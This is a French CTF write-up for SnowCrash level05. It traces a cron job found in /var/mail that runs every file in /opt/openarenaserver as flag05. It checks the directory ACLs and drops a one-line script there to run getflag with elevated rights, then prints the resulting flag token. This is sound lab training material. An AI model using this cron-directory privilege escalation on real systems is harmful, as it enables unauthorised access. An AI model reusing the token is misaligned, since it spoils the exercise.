# LEVEL05

Lorsque l'on se connecte au level05 un message s'affiche sur stdout:

``` bash
➜  ~ ssh level05@192.168.56.101 -p 4242
	   _____                      _____               _     
	  / ____|                    / ____|             | |    
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.56.101 
level05@192.168.56.101's password: 
You have new mail
```

On va chercher dans le dossier ```/var```. Ce dossier est destiné aux fichiers dont le contenu ou la taille évolue, on y trouve les données dynamiques du système (contrairement à `/usr` et `/bin` qui contiennent des fichiers statiques).

On y trouve notamment les logs, le cache, les spools (les files d'attente pour l'impression ou les mails sortants). Les mails sont aussi traditionnellement dans le dossier ```/var/mail```, c'est l'emplacement standard pour les boites de réception locales des utilisateurs sur un système Unix/Linux.

``` diff
level05@SnowCrash:/$ cd var
level05@SnowCrash:/var$ ls -la
total 0
drwxr-xr-x 1 root root     160 Mar 12  2016 .
drwxr-xr-x 1 root root     240 Mar 17 10:47 ..
drwxr-xr-x 2 root root       3 Apr 19  2012 backups
drwxr-xr-x 1 root root      60 Aug 30  2015 cache
drwxrwsrwt 2 root whoopsie   3 Mar 12  2016 crash
drwxr-xr-x 1 root root     180 Mar 17 10:47 lib
drwxrwsr-x 2 root staff      3 Apr 19  2012 local
lrwxrwxrwx 1 root root       9 Aug 29  2015 lock -> /run/lock
drwxr-xr-x 1 root root     300 Mar 17 10:47 log
+drwxrwsr-x 1 root mail      60 Mar  5  2016 mail
drwxr-xr-x 2 root root       3 Aug 29  2015 opt
lrwxrwxrwx 1 root root       4 Mar 12  2016 run -> /run
drwxr-xr-x 5 root root      70 Aug 29  2015 spool
d-wx-wx-wx 1 root root      40 Mar  5  2016 tmp
drwxr-xr-x 1 root root     100 Mar 17 10:47 www
```

En examinant le dossier mail on y trouve le fichier level05 qui contient la définition d'une tache planifiée (cron job).

``` bash
level05@SnowCrash:/var$ cd mail
level05@SnowCrash:/var/mail$ ls
level05
level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

```
En décomposant la commande cron job on comprend que que le script `sh /usr/sbin/openarenaserver` est exécutée toutes les 2 minutes avec les permissions de l'utilisateur flag05.

On va rechercher et afficher le script en question:

``` bash
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

``` bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Le script parcourt le dossier `/opt/openarenaserver/` et traite chaque fichier dans un sous-shell (`( )`) Pour chaque fichier le script exécute son contenu avec bash en mode d'exécution verbeux (`bash -x`). Les fichiers sont progressivement supprimés (`rm -f "$i"`).

`ulimit -t 5` limite le temps CPU, c'est une sécurité classique pour éviter qu'un script malveillant ne consomme toutes les ressources du serveur. Ici apres 5 secondes le kernel envoi SIGXCPU et tue le programme.

Le script execute donc les fichiers présents dans `/usr/sbin/openarenaserver`.

On cherche à savoir quels sont les permissions dans le dossier:

``` bash
level05@SnowCrash:/opt/openarenaserver$ ls -la
total 0
drwxrwxr-x+ 2 root root 40 Mar  5 10:43 .
drwxr-xr-x  1 root root 60 Mar  5 10:43 ..
```

En observant cette sortie l'utilisateur non root n'a le droit que de le lecture et d'execution.
Mais le bit `+` signifie qu'il y a des précisions sur les permissions des ACL (Access Control Lists) à regarder avec `getfacl`. Ces précisions prévalent sur les permissions classiques, l'utilisateur level05 à donc les droits de lecture, d'écriture et d'exécution.


``` diff
level05@SnowCrash:/opt/openarenaserver$ getfacl .
# file: .
# owner: root
# group: root
user::rwx
+user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x

```

On va donc creer un script dans le dossier `/opt/openarenaserver` pour affficher le resultat de la commande getflag.

De manière historique, les sorties des taches cron étaient envoyées par mail à l'utilisateur. Par défaut, le script est lancé ici en arrière plan, on ne verra donc pas son resultat sur la sortie standard. Nous allons donc rediriger le resultat de getflag dans un autre fichier pour pouvoir le lire.

On ne peux pas mettre le resultat dans /opt/openarenaserver car le script supprime chaque fichier présent dans le dossier juste après avoir executé le script. On va donc rediriger la sortie de la commande vers `/tmp`. `/tmp` est un répertoire dont les permissions permettent généralement à n'importe qui d'y écrire sans pouvoir supprimer les fichiers des autres.

Le fichier créée le sera avec les permissions de flag05 qui est l'utilisateur qui exécute le script.

``` bash
level05@SnowCrash:/opt/openarenaserver$ echo "getflag > /tmp/myfile" > script.sh
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/myfile
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Sources:
- https://blog.stephane-robert.info/docs/admin-serveurs/linux/cron/